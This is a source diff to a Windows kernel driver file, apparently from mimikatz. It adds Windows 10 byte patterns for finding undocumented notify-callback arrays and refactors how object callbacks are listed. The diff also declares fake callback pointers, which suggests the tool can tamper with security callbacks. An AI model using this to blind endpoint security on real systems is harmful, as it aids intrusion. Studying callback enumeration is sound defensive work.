@@ -1,7 +1,7 @@
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
-	Licence : http://creativecommons.org/licenses/by/3.0/fr/
+	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kkll_m_notify.h"
 
@@ -13,66 +13,81 @@ PKKLL_M_MEMORY_OFFSETS pCmpCallBackOffsets = NULL;
 POBJECT_DIRECTORY *ObpTypeDirectoryObject = NULL;
 PKKLL_M_MEMORY_OFFSETS pObpTypeDirectoryObjectOffsets = NULL;
 
+PPSSETCREATEPROCESSNOTIFYROUTINEEX pPsSetCreateProcessNotifyRoutineEx = NULL;
+POB_PRE_OPERATION_CALLBACK kkll_m_notify_fakePre = NULL;
+POB_POST_OPERATION_CALLBACK kkll_m_notify_fakePost = NULL;
+
+
 #ifdef _M_X64
 UCHAR PTRN_W23_Thread[] =	{0x66, 0x90, 0x66, 0x90, 0x48, 0x8b, 0xce, 0xe8};
 UCHAR PTRN_WVI_Thread[] =	{0x49, 0x8b, 0x8c, 0x24, 0xf8, 0x01, 0x00, 0x00, 0x41, 0xb0, 0x01, 0x49, 0x8b, 0x94, 0x24, 0x88, 0x03, 0x00, 0x00};
 UCHAR PTRN_WI7_Thread[] =	{0x41, 0xbf, 0x40, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xcb, 0xe8};
 UCHAR PTRN_WI8_Thread[] =	{0xbf, 0x40, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xcb, 0xe8};
 UCHAR PTRN_W81_Thread[] =	{0x41, 0xbf, 0x40, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xcb, 0xe8};
+UCHAR PTRN_W10_Thread[] =	{0x45, 0x33, 0xc0, 0x48, 0x8d, 0x0c, 0xd9, 0x48, 0x8b, 0xd7, 0xe8};
 KKLL_M_MEMORY_GENERIC ThreadReferences[] = {
 	{KiwiOsIndex_2K3,	{sizeof(PTRN_W23_Thread), PTRN_W23_Thread},		L"PsReferencePrimaryToken",				L"CcSetBcbOwnerPointer",			{ -4,  8}},
 	{KiwiOsIndex_VISTA,	{sizeof(PTRN_WVI_Thread), PTRN_WVI_Thread},		L"PsDereferenceKernelStack",			L"ExRaiseAccessViolation",			{-20, 64}},
 	{KiwiOsIndex_7,		{sizeof(PTRN_WI7_Thread), PTRN_WI7_Thread},		L"PsDereferenceKernelStack",			L"MmIsVerifierEnabled",				{ -4, 64}},
 	{KiwiOsIndex_8,		{sizeof(PTRN_WI8_Thread), PTRN_WI8_Thread},		L"PsAcquireProcessExitSynchronization",	L"FsRtlAddToTunnelCache",			{ -4, 64}},
-	{KiwiOsIndex_BLUE,	{sizeof(PTRN_W81_Thread), PTRN_W81_Thread},		L"NtFindAtom",							L"RtlLookupAtomInAtomTable",		{ -4, 64}},
+	{KiwiOsIndex_BLUE,	{sizeof(PTRN_W81_Thread), PTRN_W81_Thread},		L"RtlCopySidAndAttributesArray",		L"NtFindAtom",						{ -4, 64}},
+	{KiwiOsIndex_10,	{sizeof(PTRN_W10_Thread), PTRN_W10_Thread},		L"PsSetCreateThreadNotifyRoutine",		L"PsSetCreateProcessNotifyRoutine",	{ -4, 64}},
 };
 UCHAR PTRN_W23_Process[] =	{0x41, 0xbf, 0x08, 0x00, 0x00, 0x00, 0x49, 0x8b, 0xdf, 0x48, 0x8b, 0xce, 0xe8};
 UCHAR PTRN_WVI_Process[] =	{0x48, 0x89, 0x4c, 0x24, 0x40, 0x41, 0xbe, 0x40, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0c, 0xc1, 0xe8};
 UCHAR PTRN_WI7_Process[] =	{0x4c, 0x8b, 0xf9, 0x48, 0x8d, 0x0c, 0xc1, 0xe8};
 UCHAR PTRN_WI8_Process[] =	{0x8b, 0xc3, 0x48, 0x8d, 0x34, 0xc1, 0x48, 0x8b, 0xce, 0xe8};
 UCHAR PTRN_W81_Process[] =	{0x48, 0x8d, 0x04, 0xc1, 0x48, 0x89, 0x45, 0x70, 0x48, 0x8b, 0xc8, 0xe8};
+UCHAR PTRN_W10_Process[] =	{0x8b, 0xc3, 0x45, 0x33, 0xc0, 0x48, 0x8b, 0xd6, 0x49, 0x8d, 0x0c, 0xc7, 0xe8};
 KKLL_M_MEMORY_GENERIC ProcessReferences[] = {
 	{KiwiOsIndex_2K3,	{sizeof(PTRN_W23_Process), PTRN_W23_Process},	L"PsReferencePrimaryToken",				L"CcSetBcbOwnerPointer",			{ -4,  8}},
 	{KiwiOsIndex_VISTA,	{sizeof(PTRN_WVI_Process), PTRN_WVI_Process},	L"SeCreateAccessStateEx",				L"PsReferenceImpersonationToken",	{ -4, 64}},
 	{KiwiOsIndex_7,		{sizeof(PTRN_WI7_Process), PTRN_WI7_Process},	L"RtlAreAllAccessesGranted",			L"RtlGetIntegerAtom",				{ -4, 64}},
 	{KiwiOsIndex_8,		{sizeof(PTRN_WI8_Process), PTRN_WI8_Process},	L"PsAcquireProcessExitSynchronization",	L"FsRtlAddToTunnelCache",			{ -4, 64}},
-	{KiwiOsIndex_BLUE,	{sizeof(PTRN_W81_Process), PTRN_W81_Process},	L"NtFindAtom",							L"RtlLookupAtomInAtomTable",		{ -4, 64}},
+	{KiwiOsIndex_BLUE,	{sizeof(PTRN_W81_Process), PTRN_W81_Process},	L"RtlCopySidAndAttributesArray",		L"NtFindAtom",						{ -4, 64}},
+	{KiwiOsIndex_10,	{sizeof(PTRN_W10_Process), PTRN_W10_Process},	L"PsSetCreateProcessNotifyRoutine",		L"IoReportDetectedDevice",			{ -4, 64}},
 };
 UCHAR PTRN_W23_Image[] =	{0x4c, 0x8b, 0xf1, 0x48, 0x89, 0x78, 0x20, 0x4d, 0x8b, 0xe0, 0x4c, 0x8b, 0xea, 0xbd, 0x08, 0x00, 0x00, 0x00};
 UCHAR PTRN_WVI_Image[] =	{0x4c, 0x8b, 0xf2, 0x41, 0x0f, 0xba, 0x6d, 0x00, 0x0a, 0x4c, 0x8b, 0xf9, 0x49, 0xc7, 0x00, 0x38, 0x00, 0x00, 0x00};
 UCHAR PTRN_WI7_Image[] =	{0x41, 0x0f, 0xba, 0x6d, 0x00, 0x0a, 0xbb, 0x01, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0xf2, 0x4c, 0x8b, 0xf9};
 UCHAR PTRN_WI8_Image[] =	{0xbf, 0x08, 0x00, 0x00, 0x00, 0x41, 0x89, 0x06, 0x0f, 0x1f, 0x04, 0x00, 0x48, 0x8b, 0xcb, 0xe8};
-UCHAR PTRN_W81_Image[] =	{0x41, 0xbe, 0x08, 0x00, 0x00, 0x00, 0x89, 0x06, 0x48, 0x8b, 0xcf, 0xe8};
+UCHAR PTRN_W81_Image[] =	{0x45, 0x33, 0xc0, 0x48, 0x8b, 0xd7, 0x48, 0x8d, 0x0c, 0xd9, 0xe8};
+UCHAR PTRN_W10_Image[] =	{0x45, 0x33, 0xc0, 0x48, 0x8d, 0x0c, 0xd9, 0x48, 0x8b, 0xd7, 0xe8};
 KKLL_M_MEMORY_GENERIC ImageReferences[] = {
 	{KiwiOsIndex_2K3,	{sizeof(PTRN_W23_Image), PTRN_W23_Image},		L"PsRemoveLoadImageNotifyRoutine",			L"PsSetLegoNotifyRoutine",			{ -4,  8}},
 	{KiwiOsIndex_VISTA,	{sizeof(PTRN_WVI_Image), PTRN_WVI_Image},		L"NtRequestPort",							L"RtlQueryTimeZoneInformation",		{ -4,  8}},
-	{KiwiOsIndex_7,		{sizeof(PTRN_WI7_Image), PTRN_WI7_Image},		L"FsRtlReleaseFile",						L"IoSetPartitionInformationEx",		{ -4,  8}},
+	{KiwiOsIndex_7,		{sizeof(PTRN_WI7_Image), PTRN_WI7_Image},		L"FsRtlReleaseFile",						L"IoSetPartitionInformationEx",		{ -4,  64}},
 	{KiwiOsIndex_8,		{sizeof(PTRN_WI8_Image), PTRN_WI8_Image},		L"ExSizeOfRundownProtectionCacheAware",		L"MmProbeAndLockProcessPages",		{ -4,  8}},
-	{KiwiOsIndex_BLUE,	{sizeof(PTRN_W81_Image), PTRN_W81_Image},		L"NtFindAtom",								L"RtlLookupAtomInAtomTable",		{ -4,  8}},
+	{KiwiOsIndex_BLUE,	{sizeof(PTRN_W81_Image), PTRN_W81_Image},		L"PsSetLoadImageNotifyRoutine",				L"PsSetCreateThreadNotifyRoutine",	{ -4,  64}},
+	{KiwiOsIndex_10,	{sizeof(PTRN_W10_Image), PTRN_W10_Image},		L"PsSetLoadImageNotifyRoutine",				L"ObRegisterCallbacks",				{ -4,  64}},
 };
 UCHAR PTRN_W23_Object[] =	{0x40, 0x32, 0xf6, 0x4c, 0x89, 0x7c, 0x24, 0x78, 0x45, 0x33, 0xff, 0x4d, 0x85, 0xe4};
 UCHAR PTRN_WVI_Object[] =	{0x41, 0x8a, 0xdf, 0x4c, 0x89, 0x7c, 0x24, 0x58, 0x4d, 0x3b, 0xe7, 0x88, 0x5c, 0x24, 0x66, 0x4c, 0x89, 0x7c, 0x24, 0x50, 0x49, 0x8b, 0xef, 0xc7, 0x44, 0x24, 0x68};
 UCHAR PTRN_WI7_Object[] =	{0x41, 0x8a, 0xde, 0x44, 0x88, 0x74, 0x24, 0x47, 0x88, 0x5c, 0x24, 0x46, 0x4c, 0x89, 0x74, 0x24, 0x38, 0x4c, 0x89, 0x74, 0x24, 0x30, 0x49, 0x8b, 0xee, 0xc7, 0x44, 0x24, 0x48};
 UCHAR PTRN_WI8_Object[] =	{0x41, 0x8a, 0xd8, 0x44, 0x88, 0x44, 0x24, 0x4f, 0x88, 0x5c, 0x24, 0x4e, 0x4c, 0x89, 0x44, 0x24, 0x38, 0x4d, 0x8b, 0xf0, 0x4c, 0x89, 0x44, 0x24, 0x30, 0xc7, 0x44, 0x24, 0x50};
 UCHAR PTRN_W81_Object[] =	{0x41, 0x8a, 0xd8, 0x44, 0x88, 0x44, 0x24, 0x4f, 0x88, 0x5c, 0x24, 0x4e, 0x4c, 0x89, 0x44, 0x24, 0x38, 0x4d, 0x8b, 0xf0, 0x4c, 0x89, 0x44, 0x24, 0x30, 0xc7, 0x44, 0x24, 0x50};
+UCHAR PTRN_W10_Object[] =	{0x41, 0x8a, 0xd8, 0x88, 0x5c, 0x24, 0x4e, 0x4d, 0x8b, 0xf0, 0x44, 0x88, 0x44, 0x24, 0x4f};
 KKLL_M_MEMORY_GENERIC ObjectReferences[] = {
 	{KiwiOsIndex_2K3,	{sizeof(PTRN_W23_Object), PTRN_W23_Object},		L"ObCreateObjectType",						L"ObReferenceSecurityDescriptor",	{ -4, 0x078, 0x0d8}},
 	{KiwiOsIndex_VISTA,	{sizeof(PTRN_WVI_Object), PTRN_WVI_Object},		L"ObRegisterCallbacks",						L"ObCreateObjectType",				{ -4, 0x010, 0x070, 0x228}},
 	{KiwiOsIndex_7,		{sizeof(PTRN_WI7_Object), PTRN_WI7_Object},		L"ObUnRegisterCallbacks",					L"ObCreateObjectType",				{ -4, 0x010, 0x070, 0x0c0}},
 	{KiwiOsIndex_8,		{sizeof(PTRN_WI8_Object), PTRN_WI8_Object},		L"ObCreateObjectType",						L"IoCreateController",				{ -4, 0x010, 0x070, 0x0c8}},
 	{KiwiOsIndex_BLUE,	{sizeof(PTRN_W81_Object), PTRN_W81_Object},		L"ObCreateObjectType",						L"RtlRunOnceInitialize",			{ -4, 0x010, 0x070, 0x0c8}},
+	{KiwiOsIndex_10,	{sizeof(PTRN_W10_Object), PTRN_W10_Object},		L"ObCreateObjectType",						L"RtlRunOnceInitialize",			{ -4, 0x010, 0x070, 0x0c8}},
 };
 UCHAR PTRN_W23_Reg[] =	{0x49, 0x8d, 0x0c, 0xdc, 0x45, 0x33, 0xc0, 0x48, 0x8b, 0xd7, 0xe8};
 UCHAR PTRN_WVI_Reg[] =	{0x48, 0x8b, 0xf0, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x85, 0xc0, 0x0f, 0x84};
 UCHAR PTRN_WI7_Reg[] =	{0x48, 0x8b, 0xf8, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x3b, 0xc3, 0x0f, 0x84};
 UCHAR PTRN_WI8_Reg[] =	{0x49, 0x8b, 0x04, 0x24, 0x48, 0x3b, 0x43, 0x18, 0x74};
 UCHAR PTRN_W81_Reg[] =	{0x49, 0x8b, 0x04, 0x24, 0x48, 0x3b, 0x43, 0x18, 0x74};
+UCHAR PTRN_W10_Reg[] =	{0x48, 0x8b, 0x46, 0x08, 0x48, 0x8b, 0x08, 0x48, 0x89, 0x0f, 0x48, 0x89, 0x47, 0x08};
 KKLL_M_MEMORY_GENERIC RegReferences[] = {
-	{KiwiOsIndex_2K3,	{sizeof(PTRN_W23_Reg), PTRN_W23_Reg},			L"CmRegisterCallback",						L"CmUnRegisterCallback",			{ -6}},
-	{KiwiOsIndex_VISTA,	{sizeof(PTRN_WVI_Reg), PTRN_WVI_Reg},			L"CmUnRegisterCallback",					L"SeSetAuthorizationCallbacks",		{ -9, 0x030}},
-	{KiwiOsIndex_7,		{sizeof(PTRN_WI7_Reg), PTRN_WI7_Reg},			L"CmUnRegisterCallback",					L"CmRegisterCallback",				{ -9, 0x028}},
-	{KiwiOsIndex_8,		{sizeof(PTRN_WI8_Reg), PTRN_WI8_Reg},			L"CmSetCallbackObjectContext",				L"CmGetCallbackVersion",			{ -9, 0x028}},
-	{KiwiOsIndex_BLUE,	{sizeof(PTRN_W81_Reg), PTRN_W81_Reg},			L"CmSetCallbackObjectContext",				L"DbgkLkmdUnregisterCallback",		{ -9, 0x028}},
+	{KiwiOsIndex_2K3,	{sizeof(PTRN_W23_Reg), PTRN_W23_Reg},			L"CmRegisterCallback",						L"CmUnRegisterCallback",			{  -6}},
+	{KiwiOsIndex_VISTA,	{sizeof(PTRN_WVI_Reg), PTRN_WVI_Reg},			L"CmUnRegisterCallback",					L"SeSetAuthorizationCallbacks",		{  -9, 0x030}},
+	{KiwiOsIndex_7,		{sizeof(PTRN_WI7_Reg), PTRN_WI7_Reg},			L"CmUnRegisterCallback",					L"CmRegisterCallback",				{  -9, 0x028}},
+	{KiwiOsIndex_8,		{sizeof(PTRN_WI8_Reg), PTRN_WI8_Reg},			L"CmSetCallbackObjectContext",				L"CmGetCallbackVersion",			{  -9, 0x028}},
+	{KiwiOsIndex_BLUE,	{sizeof(PTRN_W81_Reg), PTRN_W81_Reg},			L"CmSetCallbackObjectContext",				L"DbgkLkmdUnregisterCallback",		{  -9, 0x028}},
+	{KiwiOsIndex_10,	{sizeof(PTRN_W10_Reg), PTRN_W10_Reg},			L"CmRegisterCallback",						L"IoEnumerateRegisteredFiltersList",{ -13, 0x028}},
 };
 #elif defined _M_IX86
 UCHAR PTRN_WXP_Thread[] =	{0xc7, 0x45, 0xa4, 0x08, 0x00, 0x00, 0x00, 0xff, 0x75, 0xbc, 0xe8};
@@ -81,6 +96,7 @@ UCHAR PTRN_WVI_Thread[] =	{0xc7, 0x45, 0x0c, 0x40, 0x00, 0x00, 0x00, 0x53, 0xe8}
 UCHAR PTRN_WI7_Thread[] =	{0xc7, 0x45, 0x0c, 0x40, 0x00, 0x00, 0x00, 0x56, 0xe8};
 UCHAR PTRN_WI8_Thread[] =	{0xbb, 0x40, 0x00, 0x00, 0x00, 0x8d, 0x1b, 0xe8};
 UCHAR PTRN_W81_Thread[] =	{0xc7, 0x45, 0xa8, 0x40, 0x00, 0x00, 0x00, 0x8b, 0xcf, 0xe8};
+UCHAR PTRN_W10_Thread[] =	{0x33, 0xf6, 0x6a, 0x00, 0x8b, 0xd3, 0x8b, 0xcf, 0xe8};
 KKLL_M_MEMORY_GENERIC ThreadReferences[] = {
 	{KiwiOsIndex_XP,	{sizeof(PTRN_WXP_Thread), PTRN_WXP_Thread},		L"NtSetInformationProcess",					L"LdrEnumResources",				{ -4,  8}},
 	{KiwiOsIndex_2K3,	{sizeof(PTRN_W23_Thread), PTRN_W23_Thread},		L"NtSetInformationProcess",					L"LdrEnumResources",				{ -4,  8}},
@@ -88,6 +104,7 @@ KKLL_M_MEMORY_GENERIC ThreadReferences[] = {
 	{KiwiOsIndex_7,		{sizeof(PTRN_WI7_Thread), PTRN_WI7_Thread},		L"RtlCompareUnicodeStrings",				L"ObQueryNameString",				{ -4, 64}},
 	{KiwiOsIndex_8,		{sizeof(PTRN_WI8_Thread), PTRN_WI8_Thread},		L"PsAssignImpersonationToken",				L"NtFindAtom",						{ -4, 64}},
 	{KiwiOsIndex_BLUE,	{sizeof(PTRN_W81_Thread), PTRN_W81_Thread},		L"RtlGetIntegerAtom",						L"PsGetThreadSessionId",			{ -4, 64}},
+	{KiwiOsIndex_10,	{sizeof(PTRN_W10_Thread), PTRN_W10_Thread},		L"PsSetCreateProcessNotifyRoutine",			L"PoRegisterCoalescingCallback",	{ -4, 64}},
 };
 UCHAR PTRN_WXP_Process[] =	{0xc7, 0x45, 0xb0, 0x08, 0x00, 0x00, 0x00, 0xff, 0x75, 0xcc, 0xe8};
 UCHAR PTRN_W23_Process[] =	{0xc7, 0x45, 0xb0, 0x08, 0x00, 0x00, 0x00, 0xff, 0x75, 0xc8, 0xe8};
@@ -95,6 +112,7 @@ UCHAR PTRN_WVI_Process[] =	{0x89, 0x4d, 0x20, 0xff, 0x75, 0x18, 0xe8};
 UCHAR PTRN_WI7_Process[] =	{0x83, 0x65, 0x30, 0x00, 0xff, 0x75, 0x20, 0xe8};
 UCHAR PTRN_WI8_Process[] =	{0x83, 0xc0, 0x40, 0x89, 0x85, 0x58, 0xff, 0xff, 0xff, 0x8d, 0x85, 0x3c, 0xff, 0xff, 0xff, 0x89, 0x45, 0x9c, 0xbe};
 UCHAR PTRN_W81_Process[] =	{0x89, 0x45, 0x9c, 0x83, 0x65, 0x8c, 0x00, 0x8b, 0xc8, 0xe8};
+UCHAR PTRN_W10_Process[] =	{0x8b, 0xdf, 0x89, 0x45, 0xf8, 0x8b, 0xd1, 0x8b, 0xc8, 0x57, 0xe8};
 KKLL_M_MEMORY_GENERIC ProcessReferences[] = {
 	{KiwiOsIndex_XP,	{sizeof(PTRN_WXP_Process), PTRN_WXP_Process},	L"NtSetInformationProcess",					L"LdrEnumResources",				{ -4,  8}},
 	{KiwiOsIndex_2K3,	{sizeof(PTRN_W23_Process), PTRN_W23_Process},	L"NtSetInformationProcess",					L"LdrEnumResources",				{ -4,  8}},
@@ -102,20 +120,23 @@ KKLL_M_MEMORY_GENERIC ProcessReferences[] = {
 	{KiwiOsIndex_7,		{sizeof(PTRN_WI7_Process), PTRN_WI7_Process},	L"RtlCompareUnicodeStrings",				L"ObQueryNameString",				{ -4, 64}},
 	{KiwiOsIndex_8,		{sizeof(PTRN_WI8_Process), PTRN_WI8_Process},	L"PsAssignImpersonationToken",				L"NtFindAtom",						{ 19, 64}},
 	{KiwiOsIndex_BLUE,	{sizeof(PTRN_W81_Process), PTRN_W81_Process},	L"RtlGetIntegerAtom",						L"PsGetThreadSessionId",			{ -4, 64}},
+	{KiwiOsIndex_10,	{sizeof(PTRN_W10_Process), PTRN_W10_Process},	L"PoRegisterCoalescingCallback",			L"RtlInitCodePageTable",			{ -4, 64}},
 };
 UCHAR PTRN_WXP_Image[] =	{0x53, 0x56, 0x57, 0x6a, 0x08, 0xbf};
 UCHAR PTRN_W23_Image[] =	{0x53, 0x56, 0x57, 0x6a, 0x08, 0xbf};
 UCHAR PTRN_WVI_Image[] =	{0xc7, 0x45, 0xfc, 0x08, 0x00, 0x00, 0x00, 0xff, 0x75, 0x10, 0xe8};
 UCHAR PTRN_WI7_Image[] =	{0xc7, 0x45, 0xfc, 0x40, 0x00, 0x00, 0x00, 0xff, 0x75, 0x10, 0xe8};
 UCHAR PTRN_WI8_Image[] =	{0xbb, 0x08, 0x00, 0x00, 0x00, 0x8b, 0xff, 0xe8};
-UCHAR PTRN_W81_Image[] =	{0xc7, 0x45, 0x0c, 0x08, 0x00, 0x00, 0x00, 0x8b, 0xcf, 0xe8};
+UCHAR PTRN_W81_Image[] =	{0x33, 0xff, 0x6a, 0x00, 0x8b, 0xd6, 0x8b, 0xcb, 0xe8};
+UCHAR PTRN_W10_Image[] =	{0x33, 0xf6, 0x6a, 0x00, 0x8b, 0xd3, 0x8b, 0xcf, 0xe8};
 KKLL_M_MEMORY_GENERIC ImageReferences[] = {
 	{KiwiOsIndex_XP,	{sizeof(PTRN_WXP_Image), PTRN_WXP_Image},		L"PsRemoveLoadImageNotifyRoutine",			L"PsCreateSystemProcess",			{  6,  8}},
 	{KiwiOsIndex_2K3,	{sizeof(PTRN_W23_Image), PTRN_W23_Image},		L"PsRemoveLoadImageNotifyRoutine",			L"PsCreateSystemThread",			{  6,  8}},
 	{KiwiOsIndex_VISTA,	{sizeof(PTRN_WVI_Image), PTRN_WVI_Image},		L"RtlUpcaseUnicodeStringToCountedOemString",L"IoCheckShareAccessEx",			{ -4,  8}},
-	{KiwiOsIndex_7,		{sizeof(PTRN_WI7_Image), PTRN_WI7_Image},		L"RtlCopySidAndAttributesArray",			L"SeImpersonateClientEx",			{ -4,  8}},
+	{KiwiOsIndex_7,		{sizeof(PTRN_WI7_Image), PTRN_WI7_Image},		L"RtlCopySidAndAttributesArray",			L"SeImpersonateClientEx",			{ -4,  64}},
 	{KiwiOsIndex_8,		{sizeof(PTRN_WI8_Image), PTRN_WI8_Image},		L"PsAssignImpersonationToken",				L"NtFindAtom",						{ -4,  8}},
-	{KiwiOsIndex_BLUE,	{sizeof(PTRN_W81_Image), PTRN_W81_Image},		L"RtlGetIntegerAtom",						L"PsGetThreadSessionId",			{ -4,  8}},
+	{KiwiOsIndex_BLUE,	{sizeof(PTRN_W81_Image), PTRN_W81_Image},		L"PsSetLoadImageNotifyRoutine",				L"ObRegisterCallbacks",				{ -4,  64}},
+	{KiwiOsIndex_10,	{sizeof(PTRN_W10_Image), PTRN_W10_Image},		L"PsSetLoadImageNotifyRoutine",				L"ObRegisterCallbacks",				{ -4,  64}},
 };
 UCHAR PTRN_WXP_Object[] =	{0x3b, 0xfb, 0xc6, 0x45, 0xe6, 0x00, 0x89, 0x5d, 0xe0, 0x89, 0x5d, 0xdc, 0xc7, 0x45, 0xe8};
 UCHAR PTRN_W23_Object[] =	{0x3b, 0xfb, 0xc6, 0x45, 0xe6, 0x00, 0x89, 0x5d, 0xdc, 0x89, 0x5d, 0xd8, 0xc7, 0x45, 0xe8};
@@ -123,6 +144,7 @@ UCHAR PTRN_WVI_Object[] =	{0x3b, 0xc3, 0x88, 0x5c, 0x24, 0x3a, 0x89, 0x5c, 0x24,
 UCHAR PTRN_WI7_Object[] =	{0xc6, 0x44, 0x24, 0x22, 0x00, 0xc6, 0x44, 0x24, 0x23, 0x00, 0x89, 0x74, 0x24, 0x18, 0x89, 0x74, 0x24, 0x14, 0xc7, 0x44, 0x24, 0x24};
 UCHAR PTRN_WI8_Object[] =	{0x33, 0xc0, 0x8b, 0xf8, 0x66, 0x89, 0x44, 0x24, 0x2a, 0x89, 0x44, 0x24, 0x1c, 0x89, 0x7c, 0x24, 0x18, 0xc7, 0x44, 0x24, 0x2c};
 UCHAR PTRN_W81_Object[] =	{0x8d, 0x44, 0x24, 0x14, 0x50, 0x33, 0xc0, 0x89, 0x7c, 0x24, 0x18, 0x50, 0x6a, 0x40};
+UCHAR PTRN_W10_Object[] =	{0x33, 0xd2, 0x66, 0x89, 0x54, 0x24, 0x26, 0x8b, 0xfa, 0x89, 0x54, 0x24, 0x18, 0x89, 0x7c, 0x24, 0x14};
 KKLL_M_MEMORY_GENERIC ObjectReferences[] = {
 	{KiwiOsIndex_XP,	{sizeof(PTRN_WXP_Object), PTRN_WXP_Object},		L"ObCreateObjectType",						L"NtOpenThread",					{ -4, 0x040, 0x08c}},
 	{KiwiOsIndex_2K3,	{sizeof(PTRN_W23_Object), PTRN_W23_Object},		L"ObCreateObjectType",						L"NtOpenThread",					{ -4, 0x040, 0x08c}},
@@ -130,6 +152,7 @@ KKLL_M_MEMORY_GENERIC ObjectReferences[] = {
 	{KiwiOsIndex_7,		{sizeof(PTRN_WI7_Object), PTRN_WI7_Object},		L"ObCreateObjectType",						L"RtlInvertRangeList",				{ -4, 0x008, 0x058, 0x080}},
 	{KiwiOsIndex_8,		{sizeof(PTRN_WI8_Object), PTRN_WI8_Object},		L"ObCreateObjectType",						L"SeTokenIsAdmin",					{ -4, 0x008, 0x058, 0x088}},
 	{KiwiOsIndex_BLUE,	{sizeof(PTRN_W81_Object), PTRN_W81_Object},		L"ObCreateObjectType",						L"KseRegisterShim",					{ -4, 0x008, 0x058, 0x088}},
+	{KiwiOsIndex_10,	{sizeof(PTRN_W10_Object), PTRN_W10_Object},		L"ObCreateObjectType",						L"KseRegisterShim",					{ -4, 0x008, 0x058, 0x088}},
 };
 UCHAR PTRN_WXP_Reg[] =	{0x89, 0x7d, 0x10, 0x57, 0xff, 0x75, 0xfc, 0xff, 0x75, 0x08, 0xe8};
 UCHAR PTRN_W23_Reg[] =	{0x89, 0x5d, 0x08, 0x53, 0xff, 0x75, 0xfc, 0x57, 0xe8};
@@ -137,6 +160,7 @@ UCHAR PTRN_WVI_Reg[] =	{0x8b, 0x03, 0x8b, 0x4b, 0x04, 0x3b, 0x46, 0x10, 0x75};
 UCHAR PTRN_WI7_Reg[] =	{0x8b, 0x03, 0x8b, 0x4b, 0x04, 0x3b, 0x46, 0x10, 0x75};
 UCHAR PTRN_WI8_Reg[] =	{0x53, 0x8d, 0x55, 0xd0, 0x8b, 0xce, 0xe8};
 UCHAR PTRN_W81_Reg[] =	{0x8b, 0x08, 0x8b, 0x40, 0x04, 0x3b, 0x4e, 0x10, 0x75};
+UCHAR PTRN_W10_Reg[] =	{0x8b, 0x4d, 0x0c, 0x8b, 0x01, 0x8b, 0x49, 0x04, 0x3b, 0x46, 0x10, 0x75};
 KKLL_M_MEMORY_GENERIC RegReferences[] = {
 	{KiwiOsIndex_XP,	{sizeof(PTRN_WXP_Reg), PTRN_WXP_Reg},			L"CmRegisterCallback",						L"FsRtlMdlReadDev",					{ -4}},
 	{KiwiOsIndex_2K3,	{sizeof(PTRN_W23_Reg), PTRN_W23_Reg},			L"CmRegisterCallback",						L"FsRtlCopyRead",					{ -4}},
@@ -144,6 +168,7 @@ KKLL_M_MEMORY_GENERIC RegReferences[] = {
 	{KiwiOsIndex_7,		{sizeof(PTRN_WI7_Reg), PTRN_WI7_Reg},			L"CmSetCallbackObjectContext",				L"DbgkLkmdUnregisterCallback",		{ -8, 0x01c}},
 	{KiwiOsIndex_8,		{sizeof(PTRN_WI8_Reg), PTRN_WI8_Reg},			L"CmUnRegisterCallback",					L"FsRtlIsFatDbcsLegal",				{ -4, 0x01c}},
 	{KiwiOsIndex_BLUE,	{sizeof(PTRN_W81_Reg), PTRN_W81_Reg},			L"CmSetCallbackObjectContext",				L"DbgkLkmdUnregisterCallback",		{ -8, 0x01c}},
+	{KiwiOsIndex_10,	{sizeof(PTRN_W10_Reg), PTRN_W10_Reg},			L"CmSetCallbackObjectContext",				L"CmUnRegisterCallback",			{ -8, 0x01c}},
 };
 #endif
 
@@ -286,24 +311,7 @@ NTSTATUS kkll_m_notify_list_object(PKIWI_BUFFER outBuffer)
 					if(KiwiOsIndex >= KiwiOsIndex_VISTA)
 					{
 						for(pCallbackEntry = *(POBJECT_CALLBACK_ENTRY *) (pType + pObpTypeDirectoryObjectOffsets->off3) ; NT_SUCCESS(status) && (pCallbackEntry != (POBJECT_CALLBACK_ENTRY) (pType + pObpTypeDirectoryObjectOffsets->off3)) ; pCallbackEntry = (POBJECT_CALLBACK_ENTRY) pCallbackEntry->CallbackList.Flink)
-						{
-							if(pCallbackEntry->PreOperation || pCallbackEntry->PostOperation)
-							{
-								status = kprintf(outBuffer, L"\t* Callback [type %u]\n", pCallbackEntry->Operations);
-								if(NT_SUCCESS(status) && pCallbackEntry->PreOperation)
-								{
-									status = kprintf(outBuffer, L"\t\tPreOperation  : ");
-									if(NT_SUCCESS(status))
-										status = kkll_m_modules_fromAddr(outBuffer, pCallbackEntry->PreOperation);
-								}
-								if(NT_SUCCESS(status) && pCallbackEntry->PostOperation)
-								{
-									status = kprintf(outBuffer, L"\t\tPreOperation  : ");
-									if(NT_SUCCESS(status))
-										status = kkll_m_modules_fromAddr(outBuffer, pCallbackEntry->PostOperation);
-								}
-							}
-						}
+							status = kkll_m_notify_desc_object_callback(pCallbackEntry, outBuffer);
 					}
 					for(j = 0; NT_SUCCESS(status) && (j < 8) ; j++)
 					{
@@ -320,3 +328,123 @@ NTSTATUS kkll_m_notify_list_object(PKIWI_BUFFER outBuffer)
 	}
 	return status;
 }
+
+NTSTATUS kkll_m_notify_desc_object_callback(POBJECT_CALLBACK_ENTRY pCallbackEntry, PKIWI_BUFFER outBuffer)
+{
+	NTSTATUS status = STATUS_SUCCESS;
+	if(pCallbackEntry->PreOperation || pCallbackEntry->PostOperation)
+	{
+		status = kprintf(outBuffer, L"\t* Callback [type %u] - Handle 0x%p (@ 0x%p)\n", pCallbackEntry->Operations, pCallbackEntry->Handle, pCallbackEntry);
+		if(NT_SUCCESS(status) && pCallbackEntry->PreOperation)
+		{
+			status = kprintf(outBuffer, L"\t\tPreOperation  : ");
+			if(NT_SUCCESS(status))
+				status = kkll_m_modules_fromAddr(outBuffer, pCallbackEntry->PreOperation);
+		}
+		if(NT_SUCCESS(status) && pCallbackEntry->PostOperation)
+		{
+			status = kprintf(outBuffer, L"\t\tPreOperation  : ");
+			if(NT_SUCCESS(status))
+				status = kkll_m_modules_fromAddr(outBuffer, pCallbackEntry->PostOperation);
+		}
+	}
+	return status;
+}
+
+
+UNICODE_STRING uPsSetCreateProcessNotifyRoutineEx = {66, 68, L"PsSetCreateProcessNotifyRoutineEx"};
